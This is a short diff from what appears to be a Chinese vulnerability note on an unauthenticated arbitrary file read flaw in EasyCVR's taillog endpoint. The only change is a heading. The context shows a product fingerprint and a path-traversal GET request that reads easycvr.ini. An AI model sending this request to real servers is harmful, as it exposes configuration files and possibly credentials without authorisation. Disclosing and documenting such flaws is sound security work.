@@ -8,7 +8,7 @@ EasyCVR-视频管理平台 taillog 接口存在任意文件读取漏洞，未经
 app="EasyCVR-视频管理平台"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
